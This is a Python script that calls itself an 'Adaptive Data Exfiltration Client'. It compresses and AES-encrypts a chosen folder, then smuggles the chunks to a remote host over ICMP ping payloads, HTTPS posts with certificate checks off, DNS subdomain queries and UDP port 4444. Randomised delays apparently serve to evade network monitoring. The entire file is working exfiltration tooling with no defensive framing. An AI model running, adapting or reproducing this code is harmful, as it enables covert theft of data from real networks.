import subprocess
import requests
import argparse
import dns.resolver
import socket
import uuid
import tarfile
import os
import time
import base64
import random
import binascii
import math
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

CHUNK_SIZE = 512  # Adjust as needed

ICMP_PAYLOAD_SIZE_BYTES = 16
ICMP_PAYLOAD_SIZE_HEX = ICMP_PAYLOAD_SIZE_BYTES * 2  # 112 hex characters

DNS_MAX_PAYLOAD = 63  # DNS label size limit

AES_KEY = b"this_is_a_32byte_key_for_aes_123"  # Exactly 32 bytes
AES_BLOCK_SIZE = 16  # AES block size for padding

MAX_TRIES = 1


def pad(data):
    """PKCS7 Padding for AES-CBC."""
    pad_len = AES_BLOCK_SIZE - (len(data) % AES_BLOCK_SIZE)
    return data + bytes([pad_len] * pad_len)



def compress_encrypt_split(folder_path):
    """Compress folder, encrypt, and split into Base64 encoded chunks."""
    session_id = str(uuid.uuid4())[:8]  # Unique Session ID
    archive_name = f"{session_id}.tar.gz"

    # Step 1: Compress the folder
    with tarfile.open(archive_name, "w:gz") as tar:
        tar.add(folder_path, arcname=os.path.basename(folder_path))

    print(f"[+] Compressed {folder_path} into {archive_name}")

    # Step 2: Encrypt the tar file using AES
    with open(archive_name, "rb") as f:
        plaintext = f.read()

    plaintext = pad(plaintext)
    iv = get_random_bytes(AES_BLOCK_SIZE)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)

    encrypted_file = f"{session_id}_encrypted.bin"
    with open(encrypted_file, "wb") as f:
        f.write(iv + ciphertext)  # Prepend IV to the encrypted data

    print(f"[+] Encrypted file saved as {encrypted_file}")

    # Step 3: Read the encrypted file & split into chunks
    with open(encrypted_file, "rb") as f:
        file_data = f.read()

    total_chunks = (len(file_data) + CHUNK_SIZE - 1) // CHUNK_SIZE  # Ensure correct chunk count
    chunks = [
        (session_id, idx, total_chunks, base64.b64encode(file_data[i:i+CHUNK_SIZE]).decode())
        for idx, i in enumerate(range(0, len(file_data), CHUNK_SIZE))
    ]

    print(f"[+] Split data into {len(chunks)} chunks with session ID {session_id}.")
    return session_id, chunks




def send_icmp(target_ip, session_id, chunk_id, total_chunks, chunk):
    """Send Base64 encoded chunk via ICMP, optimized to remove redundant decoding steps."""
    try:
        header_length = 16  # 8 (Session ID) + 2 (Chunk ID) + 2 (Total Chunks) + 2 (Part ID) + 2 (Part Length)
        data_chunk_size = ICMP_PAYLOAD_SIZE_HEX - header_length  # Adjust payload size

        # Directly convert Base64 to hex (without unnecessary encoding/decoding)
        hex_data = binascii.hexlify(chunk.encode()).decode()

        num_packets = math.ceil(len(hex_data) / data_chunk_size)
        payload_size = 32

        for i in range(num_packets):
            part = hex_data[i * data_chunk_size:(i + 1) * data_chunk_size]
            payload = f"{session_id}{chunk_id:02X}{total_chunks:02X}{i:02X}{len(part):02X}{part}"
            if i == (num_packets - 1):
                payload_size = len(payload) // 2
            subprocess.run(["ping", "-c", "1", "-s",str(payload_size), "-p", payload, target_ip], check=True)
            print(f"[+] Sent ICMP packet {i+1}/{num_packets} for chunk {chunk_id}.")

        return True
    except Exception as e:
        print(f"[-] ICMP failed for chunk {chunk_id}: {e}")
        return False


def send_https(target_ip, session_id, chunk_id, total_chunks, chunk):
    """Send Base64 chunk via HTTPS."""
    url = f"https://{target_ip}/upload"
    try:
        response = requests.post(url, json={"session_id": session_id, "chunk_id": chunk_id, 
                                            "total_chunks": total_chunks, "chunk": chunk}, verify=False)
        print(f"[+] Sent chunk {chunk_id} via HTTPS: {response.status_code}")
        return True
    except:
        return False

def send_dns(target_domain, session_id, chunk_id, total_chunks, chunk, max_retries=3):
    """Send Base64 chunk via DNS with ACK verification and retries."""
    resolver = dns.resolver.Resolver()
    resolver.nameservers = ["127.0.0.1"]
    resolver.port = 5354  # Custom DNS exfiltration port

    chunk_safe = base64.urlsafe_b64encode(base64.b64decode(chunk)).decode().rstrip("=")
    chunk_parts = [chunk_safe[i:i + 50] for i in range(0, len(chunk_safe), 50)]  # Reduce size per part
    total_parts = len(chunk_parts)

    print(f"[DEBUG] Chunk {chunk_id} split into {total_parts} parts")

    for part_id, part in enumerate(chunk_parts):
        query = f"{session_id}.{chunk_id}.{total_chunks}.{part_id}.{total_parts}.{part}.{target_domain}"
        print(f"[DEBUG] Sending DNS query (length {len(query)}): {query}")

        try:
            response = resolver.resolve(query, "A")  # Send query

            # Check if we got the acknowledgment (127.0.0.10)
            for answer in response:
                if answer.to_text() == "127.0.0.10":
                    print(f"[+] ACK received for part {part_id+1}/{total_parts} of chunk {chunk_id}.")
                    break
            else:
                print(f"[-] WARNING: No ACK for part {part_id+1}/{total_parts}. Retrying...")
                continue  # Retry

            break  # Break retry loop if ACK received

        except Exception as e:
            print(f"[-] DNS request failed for part {part_id}: {e}")



def send_udp(target_ip, session_id, chunk_id, total_chunks, chunk):
    """Send Base64 chunk via UDP."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = f"{session_id}.{chunk_id}.{total_chunks}.{chunk}"
    try:
        sock.sendto(message.encode(), (target_ip, 4444))
        print(f"[+] Sent chunk {chunk_id} via UDP.")
        return True
    except:
        return False


def send_data(target_ip, folder_path, target_domain):
    """Compress folder, split into chunks, and send using multiple protocols with retries and exponential jitter."""
    session_id, chunks = compress_encrypt_split(folder_path)

    base_delay = 1.0  # Base delay in seconds
    lambda_ = 1.5  # Exponential jitter factor

    for session_id, chunk_id, total_chunks, chunk in chunks:
        success = False
        attempts = 0  # Track number of tries per chunk

        while attempts < MAX_TRIES and not success:
            delay = min(5.0, base_delay + random.expovariate(lambda_))  # Realistic network jitter
            time.sleep(delay)
            print(f"[DEBUG] Attempt {attempts+1}/{MAX_TRIES}: Sleeping for {delay:.2f}s before sending chunk {chunk_id}")

            # Try sending via different protocols in order
            if send_icmp(target_ip, session_id, chunk_id, total_chunks, chunk):
                success = True
            elif send_https(target_ip, session_id, chunk_id, total_chunks, chunk):
                success = True
            elif send_dns(target_domain, session_id, chunk_id, total_chunks, chunk):
                success = True
            elif send_udp(target_ip, session_id, chunk_id, total_chunks, chunk):
                success = True
            
            attempts += 1

        if not success:
            print(f"[-] Failed to send chunk {chunk_id} after {MAX_TRIES} attempts. Skipping.")



           
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Adaptive Data Exfiltration Client")
    parser.add_argument("--target-ip", required=True, help="Target IP address of the server.")
    parser.add_argument("--folder", required=True, help="Path to the folder to exfiltrate.")
    parser.add_argument("--target-domain", required=True, help="Target domain for DNS exfiltration.")

    args = parser.parse_args()
    
    send_data(args.target_ip, args.folder, args.target_domain)


